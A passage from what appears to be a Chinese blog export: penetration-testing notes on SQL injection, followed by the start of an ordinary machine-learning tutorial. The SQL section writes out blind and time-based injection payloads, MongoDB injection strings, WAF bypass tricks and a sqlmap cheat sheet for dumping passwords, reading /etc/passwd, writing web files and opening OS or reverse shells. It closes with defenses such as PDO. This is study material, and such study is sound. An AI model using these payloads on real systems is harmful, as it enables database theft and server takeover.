0,1),1,1)) &gt; 100 --+或者直接猜解&#x27; or (select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;表名&#x27; limit 1,1) = &#x27;username&#x27; --+ 猜解内容长度 12假如已经知道字段名为 id username password&#x27;or (select Length(concat(username,&quot;---&quot;,password)) from admin limit 0,1) = 16 --+ 猜解内容 12345&#x27;or mid((select concat(username,&quot;-----&quot;,password) from admin limit 0,1),1,1) = &#x27;a&#x27; --+或者&#x27;or ORD(mid((select concat(username,&quot;-----&quot;,password) from admin limit 0,1),1,1)) &gt; 100 --+ ASCII码猜解或者直接猜解&#x27;or (Select concat(username,&quot;-----&quot;,password) from admin limit 0,1 ) = &#x27;admin-----123456&#x27; --+ 基于时间的SQL盲注（最后考虑）对于某些 SQL 注入页面，可能页面中任何信息都不返回，甚至连记录是否存在都不告诉你，这时布尔型盲注也就无效了。但是基于 sleep() 、benchmark()函数可以实现延时查询，我们可以构造一个判断语法，如果返回结果为真，则延时 5 秒再进行查询操作。那么我们就可以通过观察提交 SQL 注入语句后，页面响应是否有延时卡顿，来判断我们构造的 SQL 语句是否成立。 延时判断，if、sleep。 if(expr1, expr2,expr3) 如果expr1是TRUE，则IF0的返回值为expr2;否则返回值则为expr3。if()的返回值为数字值或字符串值。具体情况视其所在语境而定。 若数据库名为a，则回显123，否则回显456： if + sleep 若数据库名为a，则延时1s，否则不延时。 12345678// 猜解数据库名长度，猜中了延时5sid=1 and sleep(if(length(database())=8,5,0))--+// 逐个猜解数据库名，猜中了延时5sid=1 and if(ascii(substr(database(),1,1))=115,sleep(5),1)--+// 逐个猜解表名，猜中了延时5sid=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(3),0)--+ 12345678like &#x27;ro%&#x27; # 判断ro或ro...是否成立regexp &#x27;^xiaodi[a-z]&#x27; # 匹配xiaodi及xiaodi...等if(条件,5,0)ord() # 转换成ascii码mid (a, b, c) # 从位置b开始，截取a字符串的c个字符substr(a, b, c) # 与mid函数一样，从b位置开始，截取字符串a的c长度left (database(),1), database() # left(a,b)从左侧截取a的前b位length(database())=8 # 判断数据库database()名的长度ord=ascii ascii(x)=97 # 判断x的ascii码是否等于97 盲注的加速方法： 减少查询次数，提高查找的正确率。 二分法爆破字符； 位运算法 每次查询确定一位，这样一个字符只需要8次就可以确定了，利用位运算符&amp;实现取某一位的值。 按照注入的数据类型数字型现有的查询语句 Where 筛选条件匹配的字段是数值类型。构造注入语句时不需要单引号和#来闭合语法。 字符型现有的查询语句 Where 筛选条件匹配的字段是字符型。一般字符型注入需要构造单引号&#x2F;双引号用于闭合语法，还需要加入注释符使原本的引号以及后面的语句无效。 除单引号外，SQL语句也有其他的一些干扰符号：’ “ % ) }等，具体需看写法。 比如select * from user where name like &#39;%xiaodi%&#39;;用于搜索name字段中含有xiaodi的记录。或者select * from user where name=(&#39;xiaodi&#39;);增加了括号。 这时注入的话就要考虑%来闭合语法。实际中应该用什么符号来闭合语法需要自己尝试。 &#x3D;&#x3D;如何判断字符型、数字型&#x3D;&#x3D; 比如在文本框中输入 1 and 1=1 和 1 and 1=2，若都能返回数据（都通过），说明可能注入漏洞不是数字型，应该是字符型形式 ；因为对于字符型，使用?id=1 and 1=1相当于执行的是SELECT * FROM users WHERE id=&#39;1 and 1=1&#39; LIMIT 0,1;这样网站对于&#39;1 and 1=1&#39;或者&#39;1 and 1=2&#39;都是取前面的1，都返回数据。 此时在文本框输入 1&#39; and 1=1#，可以返回数据，输入 1&#39; and 1=2#，没有数据返回，说明注入成功，确认漏洞为id=&#39;1&#39; and 1=1#&#39;的字符型SQL注入；（注意：有时用于闭合语法的不一定为单引号，另外在mysql中一般注释后面的字句是采用的–+在有些的字句中采用#注释。需要多测试才能发现） 若在文本框中输入 1 and 1=1 和 1 and 1=2，前者返回数据，后者不返回，直接确定是 id=1 and 1=1的数值型形式。 搜索型使用了select * from users where id like &#39;%233&#39;之类的模糊匹配， 12word=a%&#x27; and 1=1# 返回正确word=a%&#x27; and 1=2# 返回错误 按照提交参数方式123456789101112131415161718&lt;?php $get=$_GET[&#x27;g&#x27;]; //get接受参数名g的值赋值给变量getecho $get;$post=$_POST[&#x27;p&#x27;]; //post接受参数名p的值赋值给变量postecho $post;$c=$_COOKIE[&#x27;c&#x27;] ;echo $c;$r=$_REQUEST[&#x27;r&#x27;] ;echo $r;$s=$_SERVER[&#x27;HTTP USER AGENT&#x27;]; // php内置函数，用于获取一些参数信息echo $s;?&gt; get数据注入get数据的注入在前面已经详细说明。 post数据注入（sqlilabs less 11） 网站的URL不会显示具体的参数，而是将参数放在web表单中以post请求的形式提交。 此时需要使用 Burpsuite 等工具来构造 POST 包。BP抓包之后在数据包中进行相同的注入流程。 或者使用hackbar构造post数据也可。 cookie注入（sqlilabs less 20） 有时网站对get、post请求都进行了关键词过滤，难以注入，但是忽略了cookie也可以传递参数。如果cookie的参数也被用于SQL语句，那么也有成功注入的可能。有时使用cookie传参时会与post冲突，此时可能需要改为使用GET请求。 request请求注入如果网站是request请求，那么可以在所有方法的位置提交，包括get、post、cookie。 下面的网站以get或post都能提交参数： $_SERVER注入php内置函数，用于获取一些参数信息。 $_SERVER详解：https://blog.csdn.net/lky_for_lucky/article/details/111300340 123$_SERVER[&#x27;HTTP_ACCEPT_LANGUAGE&#x27;] //浏览器语言$_SERVER[&#x27;REMOTE_ADDR&#x27;] //当前用户IP$_SERVER[&#x27;REMOTE_HOST&#x27;] //当前用户[主机名] 如果通过$_SERVER获取的信息被用于SQL语句，那么就可能存在注入漏洞。 比如BP抓包后，将浏览器信息User-Agent进行修改。如果网站将User-Agent字段作为SQL语句的参数，那就可能存在注入成功的可能。 json数据注入原理一样与其他注入一样，只是注入点改为json的键值对中的值。 HTTP头部参数注入（sqlilabs less 18） 有些网站调用php的$_SERVER获取一些HTTP头部信息，比如User-Agent。这些地方可以进行注入。 还有X- Forwarded- For，简称XFF头，它代表客户端真实的IP。这里也可以尝试进行注入。 上例中的SQL语句为insert操作，无法像select一样回显信息，因此只能盲注。 8. 各种数据库注入https://blog.csdn.net/qq_42438245/article/details/121579063 各种数据库的注入特点 不同的数据库具有不同的注入特点，每个数据库支持的功能不一样，获取到的权限和可执行操作等不同。 包括access、mysql、mssql、mongoDB、postgresql、sqlite、oracle、sybase等。 access注入（暴力）access数据库都是存放在网站目录下，后缀格式为 mdb，asp，asa，结构为表名&#x2F;列名&#x2F;数据，不同的网站会有各自的acess数据库。不会像mySQL那样一个网站的管理员可以操作多个mySQL数据库，导致存在跨库注入的情况。mySQL的结构为数据库名&#x2F;表名&#x2F;列名&#x2F;数据。 access没有information_ schema表，数据库名、操作系统等等都无法查询，只能暴力猜解表名、列名、数据，可以通过一些暴库手段、目录猜解等下载数据库。 判断数据库类型 由于各个数据库特征不同，这里直接使用sqlmap比较方便： 判断注入点 猜解字段数量 oder by 判断哪几个位置回显 ?id=-1 union select 1,2,3 暴力猜解表名、列名等信息 比如猜当前表为admin，看是否成功返回数据： ?id=-1 union select 1,2,3 from admin 使用工具进行暴力猜解： 尝试爆表名：sqlmap -u http://219.153.49.228:46617/new_list.asp?id=1 --tables 尝试爆表admin的列名： sqlmap -u http://219.153.49.228:46617/new_list.asp?id=1 --dump -T &quot;admin&quot; msSQL注入（pangolin穿山甲） 判断数据库类型 由于各个数据库特征不同，这里直接使用pangolin穿山甲工具进行判断： 从工具中还可以看到不同数据库可以获得的权限，明显msSQL可以得到更多权限。 在信息一栏中可以查看到数据库的各种信息：版本、数据库名、计算机名、数据库名、管理员最高权限、Sql-server对应root （mysql）、数据库各表名、磁盘、用户组、用户等。 在获取数据一栏中可以获取数据库信息，表名数据等 msSQL的手工注入 语句会与mySQL不同： https://www.cnblogs.com/wuhongbin/p/15582849.html https://www.cnblogs.com/xishaonian/p/6173644.html postgreSQL注入 可以使用工具：sqlmap、pangolin穿山甲 识别数据库类型：sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 判断数据库权限：sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -privileges --level 3 判断是否为数据库管理员：sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 --is-dba --level 3 查看当前数据库：sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 --current-db --batch 查看名为public的数据库的表名：sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -D public --tables 查看表reg_users 的列名：sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -D public -T reg_users --columns 查看表reg_users 的具体数据：sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -D public -T reg_users -C &quot;name,password&quot; --dump --batch 手工注入，某些语句会有差别： https://blog.csdn.net/hack8/article/details/6427911 https://www.cnblogs.com/yilishazi/p/14710349.html Oracle注入 使用工具：sqlmap、pangolin穿山甲 手工注入 参考文档：https://www.cnblogs.com/peterpan0707007/p/8242119.html mongoDB注入 使用工具 SQLmap不能识别MongoDB，这里介绍nosqlattack：https://github.com/youngyangyang04/NoSQLAttack 首先输入目标网站IP： 然后输入路径： 尝试攻击： 手工注入 参考文档： https://blog.csdn.net/qq_39936434/article/details/95319449 https://www.cnblogs.com/wefeng/p/11503102.html Mongodb的查询文档方式与其他的数据库略微不同，当进行条件查询的时候，mysql是用where, 而mongodb是以键值对形式进行查询的。 比如按id&#x3D;”1”查询表news中的数据：select * from admin &#123;&#39;id&#39;: &#39;1&#39;&#125;)。 构建回显，mongoDB查询操作的源代码为findone({‘id’：‘1’}) 攻击语句：/new_list.php?id=1&#39;&#125;);return(&#123;title:1,content:&#39;2 爆库 /new_list.php?id=1&#39;&#125;); return (&#123;title:tojson(db),content:&#39;1 —tojson() 方法可以将 Date 对象转换为字符串格式化为 JSON 数据格式，相当于MySQL的数据库名。 爆表 /new_list.php?id=1&#39;&#125;);return(&#123;title:tojson(db.getCollectionNames()),content:&#39;1 db.getCollectionNames()返回的是数组，转化为json格式，相当于MySQL的tables。 查询指定数据 /new_list.php?id=1&#39;&#125;);return(&#123;title:tojson(db.Authority_confidential.find()[0]),content:&#39;1 元素集中查找使用E.find(expr)函数，用于从匹配的元素集E的子元素中找出与find指定表达式expr相匹配的元素集合，E 同 expr 可视作同父子元素关系. find()[0]为第一条数据，find()[1]为第二条 由于是字典形式，所以键和值一起出来了，不需要额外查询列。 9. sqlmap12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091-u #注入点 -f #指纹判别数据库类型 -b #获取数据库版本信息 -p #指定可测试的参数(?page=1&amp;id=2 -p &quot;page,id&quot;) -D &quot;&quot; #指定数据库名 -T &quot;&quot; #指定表名 -C &quot;&quot; #指定字段 -s &quot;&quot; #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s &quot;xx.log&quot; 恢复:-s &quot;xx.log&quot; --resume) --level=(1-5) #要执行的测试水平等级，默认为1 --risk=(0-3) #测试执行的风险等级，默认为1 --time-sec=(2,5) #延迟响应，默认为5 --data #通过POST发送数据 --columns #列出字段 --current-user #获取当前用户名称 --current-db #获取当前数据库名称 --users #列数据库所有用户 --passwords #数据库用户所有密码 --privileges #查看用户权限(--privileges -U root) -U #指定数据库用户 --dbs #列出所有数据库 --tables -D &quot;&quot; #列出指定数据库中的表 --columns -T &quot;user&quot; -D &quot;mysql&quot;#列出mysql数据库中的user表的所有字段--dump-all #列出所有数据库所有表 --exclude-sysdbs #只列出用户自己新建的数据库和表 --dump -T &quot;&quot; -D &quot;&quot; -C &quot;&quot; #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) --dump -T &quot;&quot; -D &quot;&quot; --start 2 --top 4 # 列出指定数据库的表的2-4字段的数据 --dbms #指定数据库类型(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) --os #指定系统(Linux,Windows) -v #详细的等级(0-6) 0：只显示Python的回溯，错误和关键消息。 1：显示信息和警告消息。 2：显示调试消息。 3：有效载荷注入。 4：显示HTTP请求。 5：显示HTTP响应头。 6：显示HTTP响应页面的内容 --privileges #查看权限 --is-dba #是否是数据库管理员 --roles #枚举数据库用户角色 --udf-inject #导入用户自定义函数（获取系统权限） --union-check #是否支持union 注入 --union-cols #union 查询表记录 --union-test #union 语句测试 --union-use #采用union 注入 --union-tech orderby #union配合order by --data &quot;&quot; #POST方式提交数据(--data &quot;page=1&amp;id=2&quot;) --cookie &quot;用;号分开&quot; #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) --referer &quot;&quot; #使用referer欺骗(--referer &quot;http://&quot;) --user-agent &quot;&quot; #自定义user-agent --proxy &quot;http://127.0.0.1:8118&quot; #代理注入 --string=&quot;&quot; #指定关键词,字符串匹配. --threads #采用多线程(--threads 3) --sql-shell #执行指定sql命令 --sql-query #执行指定的sql语句(--sql-query &quot;SELECT password FROM mysql.user WHERE user = &#x27;root&#x27; LIMIT 0, 1&quot; ) --file-read #读取指定文件 --file-write #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) --file-dest #要写入的文件绝对路径 --os-cmd=id #执行系统命令 --os-shell #系统交互shell --os-pwn #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) --msf-path= #matesploit绝对路径(--msf-path=/opt/framework/msf3/) --os-smbrelay # --os-bof # --reg-read #读取win系统注册表 --priv-esc # --time-sec= #延迟设置 默认--time-sec=5 为5秒 -p &quot;user-agent&quot; --user-agent &quot;sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)&quot; #指定user-agent注入 --eta #盲注 /pentest/database/sqlmap/txt/common-columns.txt 字段字典 common-outputs.txt common-tables.txt 表字典 keywords.txt oracle-default-passwords.txt user-agents.txt wordlist.txt 常用语句 :1./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --users --passwords --dbs -v 0 2./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 3./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T users -C username -D userdb --start 2 --stop 3 -v 2 4./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C &quot;user,pass&quot; -v 1 --exclude-sysdbs 5./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 6./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read &quot;c:\\boot.ini&quot; -v 2 7./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 8./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd &quot;id&quot; -v 1 9./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 10./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 11./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 12./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 13./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key=&quot;HKEY_LOCAL_NACHINE\\SOFEWARE\\sqlmap&quot; --reg-value=Test --reg-type=REG_SZ --reg-data=1 14./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta 15./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;&#x27;)&quot; --suffix &quot;AND (&#x27;abc&#x27;=&#x27;abc&quot;16./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot; --auth-type Basic --auth-cred &quot;testuser:testpass&quot;17./sqlmap.py -l burp.log --scope=&quot;(www)?\\.target\\.(com|net|org)&quot;18./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot; --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 19./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot; --sql-query &quot;SELECT &#x27;foo&#x27;&quot; -v 1 20./sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --common-tables -D testdb --banner 21./sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --cookie=&quot;PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low&quot; --string=&#x27;xx&#x27; --dbs --level=3 -p &quot;uid&quot; 简单的注入流程： 123456789101112131415161718192021222324252627282930313233343536373839401.读取数据库版本，当前用户，当前数据库 sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 2.判断当前数据库用户权限 sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 3.读取所有数据库用户或指定数据库用户的密码 sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 4.获取所有数据库 sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 5.获取指定数据库中的所有表 sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 6.获取指定数据库名中指定表的字段 sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 7.获取指定数据库名中指定表中指定字段的数据 sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C &quot;username,password&quot; -s &quot;sqlnmapdb.log&quot; -v 2 8.file-read读取web文件 sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read &quot;/etc/passwd&quot; -v 2 9.file-write写入文件到web sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试：简单的注入流程 :1.读取数据库版本，当前用户，当前数据库 sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 2.判断当前数据库用户权限 sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 3.读取所有数据库用户或指定数据库用户的密码 sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 4.获取所有数据库 sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 5.获取指定数据库中的所有表 sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 6.获取指定数据库名中指定表的字段 sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 7.获取指定数据库名中指定表中指定字段的数据 sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C &quot;username,password&quot; -s &quot;sqlnmapdb.log&quot; -v 2 8.file-read读取web文件 sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read &quot;/etc/passwd&quot; -v 2 9.file-write写入文件到web sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试： 确定要注入的URL，有时需要获取访问该网站所需的cookie。 get数据注入 查询所有的数据库名 1sqlmap -u &quot;http://192.168.75.100/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &#x27;security=low; PHPSESSID=ni3gsltihh60r1q50tiu45l8p3&#x27; --dbs 查询指定数据库的所有表名信息 1sqlmap -u &quot;http://192.168.75.100/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &#x27;security=low; PHPSESSID=ni3gsltihh60r1q50tiu45l8p3&#x27; -D dvwa --table 查询指定表名下的所有列名信息 1sqlmap -u &quot;http://192.168.75.100/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &#x27;security=low; PHPSESSID=ni3gsltihh60r1q50tiu45l8p3&#x27; -D dvwa -T users --column 查询指定数据 1sqlmap -u &quot;http://192.168.75.100/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &#x27;security=low; PHPSESSID=ni3gsltihh60r1q50tiu45l8p3&#x27; -D dvwa -T users -C user,password --dump post数据注入使用 SQLMap 自动完成 POST 注入，需要把正常 POST 包的内容复制到一个 txt 文档，再调用文档来进行注入。 先使用 Burpsuite 拦截正常 POST 包，右键 - 选择 Copy to file 复制到 &#x2F;root&#x2F;post.txt 然后关闭 Burpsuite 的代理功能，再使用命令 sqlmap -r /root/post.txt --dbs，来查询数据库名称。 使用 SQLMap 命令 sqlmap -r /root/post.txt -D dvwa --table，查询表名 使用 SQLMap 命令 sqlmap -r /root/post.txt -D dvwa -T users --columns，查询字段名 使用 SQLMap 命令 sqlmap -r /root/post.txt -D dvwa -T users -C user,password --dump，查询用户名和密码内容 8. SQL注入防护字符转义addslashes()、魔术引号开关、mysql_real_escape_string 会对单引号、双引号、反斜线、NULL加上一个一个反斜线进行转义，会影响SQL注入语句中的路径信息。 绕过方法： 宽字节（待转义字符前加上%df）、 整数过滤遇到 is_int() 函数过滤输入的情况：直接跑路，无法绕过 1234567if(is_int($id))&#123; $sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;; echo $sql; $result=mysql_query($sql);&#125;else&#123; echo &#x27;ni shi ge jj?&#x27;;&#125; 过滤关键字str_replace(‘被过滤参数’,’过滤参数’,$id) 123456789if(isset($_ GET[&#x27;id&#x27;]))&#123; $id=$_ GET[&#x27;id&#x27;]; // 第一个参数是要过滤的值，第二个参数是过滤后的值 $id=str_ replace(&#x27;select&#x27; , &#x27;fuck&#x27; ,$id) // logging the connection parameters to a file for analysis. $fp-fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;); fwrite($fp, &#x27;ID:&#x27;.$id.&quot;\\n&quot;); fclose($fp);&#125; 过滤效果：select变成了fuck waf防护软件阿里云盾、安全狗、宝塔 作用机制：过滤关键字 绕过方法： 更改提交方法（get、post） 大小写混合（绕开黑名单） 解密编码类（绕开黑名单） %0A为换行符；%23为#号；%20为空格 注释符号混用（绕开注释过滤） 比如/**/、/*!*/ 等价函数替换（绕开关键字过滤） 特殊符号混用（绕开关键字过滤） 12空格被过滤，用%a0代替；and和or被过滤：可以用&amp;&amp;和||来替代； 借助数据库特性（多种SQL语句） HTTP参数污染 函数java_implimentation()的逻辑有严重错误： 一旦这个数组里的个数不止1个，并且每个组员都是id开头，那么返回只会返回第一个组员。比如id&#x3D;1&amp;id&#x3D;sql_injection的结果为为id&#x3D;1。但是$id=$_GET[&#39;id&#39;]取的是最后一个id，所以我们只需要把payload放在后面的id就好。 垃圾数据溢出 waf只能匹配一千个，多了就不行了 使用预编译PDOPDO 是 PHP Data Objects（PHP 数据对象）的缩写。是在 PHP5.1 版本之后开始支持的技术。不使用 PDO 技术时，SQL 语句是先在本地拼接完成后，再传递至数据库处理，所以会导致用户提交有猫腻的变量来改变原 SQL 语句的结构，从而实现 SQL 注入；使用 PDO 技术后，是先把 SQL 语句的整体语法，匹配的参数用 ? 当做占位符一起发送至数据库，然后再把用户提交的查询参数发送至数据库，由数据库来完成变量的转移处理。用户输入只会被当成字符串字面值参数，而SQL语句则经过语法分析，生成执行命令。这样 SQL 语句的整体语法结构和变量分开两次传递至数据库，从而导致那些有猫腻的变量无法再改变 SQL 语句的原始结构。这种情况下，SQL 注入攻击几乎无法实现。这也是目前比较有效的防御 SQL 注入攻击的方法之一。 SQL关键字无法进行预编译，如表名或者列名字段，order by + 列名，in + 列名。","raw":null,"content":null,"categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"机器学习实战","slug":"机器学习实战","date":"2022-07-30T04:20:29.000Z","updated":"2023-10-05T11:40:46.701Z","comments":true,"path":"posts/[object Object]/机器学习实战/undefined.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98/undefined","excerpt":"","text":"机器学习实战参考书目： 《机器学习实战：基于Scikit-Learn和TensorFlow》 《机器学习实战》 先导知识： 监督学习中，一般使用两种类型的目标变量，标称型和数值型。 标称型目标变量的结果只在有限目标集中取值，如真与假、动物分类集合{ 爬行类、鱼类、哺乳类、两栖类、植物、真菌}；数值型目标变量则可以从无限的数值集合中取值，如0.100、42.001、1000.743 等。标称型目标变量主要用来分类，数值型目标变量主要用于回归分析。 机器学习的主要任务：分类和回归。 分类是将实例数据划分到合适的分类中，回归主要用于预测数值型数据。分类和回归均属于监督学习，即这类算法必须知道样本的类别，即目标变量的分类信息。另外，无监督学习则指训练数据没有类别信息，也不会给定目标值。无监督学习可以进行聚类、密度估计（寻找描述数据统计值），也可以减少数据特征的维度，以便使用二维或三维图形来更直观地展示数据信息。 如何选择算法： （1）首先考虑使用算法的目的。 如果是想要知道数据的目标变量的值，可以选择监督学习算法。如果目标变量是离散的，就选择分类器算法；如果目标变量是连续的，就选择回归算法。 如果不想预测目标变量的值，可以选择无监督学习算法。如果是要将数据划分为离散的组，就选择聚类算法；如果需要估计数据与每个分组的相似程度，则需要使用密度估计算法。 （2）其次需要考虑数据问题。 特征值是离散型变量还是连续型，特征值中是否存在缺失的值，何种原因造成的缺失，数据中是否存在异常值，某个特征发生的频率如何等等。 开发机器学习应用程序的步骤： （1）收集数据； （2）准备输入数据； （3）分析输入数据：查看数据中是否存在空值、异常值等，确保没有垃圾数据。 （4）训练算法； （5）测试算法； （6）使用算法。 第一章 线性模型1. 线性回归（回归）线性模型就是对输入特征加权求和，再加上一个我们称为偏置项（也称为截距项）的常数，以此进行预测。 由于线性回归模型的梯度下降对特征缩放敏感，所以需要保证所有特征值的大小比例都差不多（比如使用Scikit-Learn的StandardScaler类），否则收敛的时间会长很多。 1234567from sklearn.linear_model import LinearRegressionlin_reg = LinearRegression()lin_reg.fit(X, y)# coef_存放回归系数，intercept_则存放截距print(lin_reg.intercept_, lin_reg.coef_)print(lin_reg.predict(X_new)) 其实大多数情况下不会使用纯线性回归，容易过拟合。通常会加上正则化（后面会讲到）。 计算复杂度： 特征数量比较大（例如100000）时，线性回归的计算将极其缓慢。但是另一方面，对于训练集中的实例数量来说，需要计算的方程是线性的，所以能够有效地处理大量的训练集，只要内存足够。在预测方面，线性回归模型一经训练（不论是标准方程还是梯度下降等其他算法），预测就非常快速：因为计算复杂度相对于想要预测的实例数量和特征数量来说，都是线性的。 2. 梯度下降标准方程： 求线性模型的最优参数可以通过标准方程直接计算得到，但是涉及计算样本特征矩阵的内积，计算复杂度较高。但是优点是不需要特征缩放，不需要选择学习率以及进行迭代。 梯度下降： 梯度下降是一种非常通用的优化算法，能够为大范围的问题找到最优解。梯度下降的中心思想就是迭代地调整参数从而使成本函数最小化。 线性回归模型的成本函数恰好是个凸函数，所以在梯度下降时不会陷入局部最优。 应用梯度下降时，需要保证所有特征值的大小比例都差不多（比如使用Scikit-Learn的StandardScaler类），否则收敛的时间会长很多。 批量梯度下降（BGD）： 基于整个训练数据集对所有需要优化的参数进行同步优化。因此，面对非常庞大的训练集时，算法会变得极慢（不过我们即将看到快得多的梯度下降算法）。但是，梯度下降算法随特征数量扩展的表现比较好：如果要训练的线性模型拥有几十万个特征，使用梯度下降比标准方程要快得多。 学习率控制了梯度下降的快慢，学习率太低，算法消耗时间太久，学习率太高，难以稳定到最优参数。要找到合适的学习率，可以使用网格搜索。 另外，参数优化的迭代次数也要适中，太低可能还未达到最优，太高浪费时间。一个简单的办法是，在开始时设置一个非常大的迭代次数，但是当梯度向量的值变得很微小时中断算法——也就是当它的范数变得低于（称为容差）时，因为这时梯度下降已经（几乎）到达了最小值。 随机梯度下降（SGD）： 批量梯度下降的主要问题是它要用整个训练集来计算每一步的梯度，所以训练集很大时，算法会特别慢。与之相反的极端是随机梯度下降，每一步在训练集中随机选择一个实例，并且仅基于该单个实例来计算梯度。这让算法变得快多了，也可以被用来训练海量的数据集。 另一方面，由于算法的随机性质，它比批量梯度下降要不规则得多。成本函数将不再是缓缓降低直到抵达最小值，而是不断上上下下，但是从整体来看，还是在慢慢下降。但是即使它到达了最小值，依旧还会持续反弹，永远不会停止。所以算法停下来的参数值肯定是足够好的，但不是最优的。 随机梯度下降其实可以帮助算法跳出局部最小值，所以相比批量梯度下降，它对找到全局最小值更有优势。因此，随机性的好处在于可以逃离局部最优，但缺点是永远定位不出最小值。要解决这个困境，有一个办法是逐步降低学习率（模拟退火）。 12345# 随机梯度下降，n_iter为迭代次数，penalty为惩罚项（正则化），eta0为迭代次数from sklearn.linear_model import SGDRegressorsgd_reg = SGDRegressor(n_iter=50, penalty=None, eta0=0.1)sgd_reg.fit(X, y)print(sgd_reg.intercept_, sgd_reg.coef_) 小批量梯度下降： 每一步的梯度计算，基于一小部分随机的实例集也就是小批量。相比随机梯度下降，小批量梯度下降的主要优势在于可以从矩阵运算的硬件优化中获得显著的性能提升，特别是需要用到图形处理器时。 这个算法在参数空间层面的前进过程也不像SGD那样不稳定，特别是批量较大时。所以小批量梯度下降最终会比SGD更接近最小值一些。但是另一方面，它可能更难从局部最小值中逃脱 3. 多项式回归当数据集并非线性时，可以将每个特征的幂次方添加为一个新特征，在拓展过的特征集上训练线性模型。这种方法被称为多项式回归。 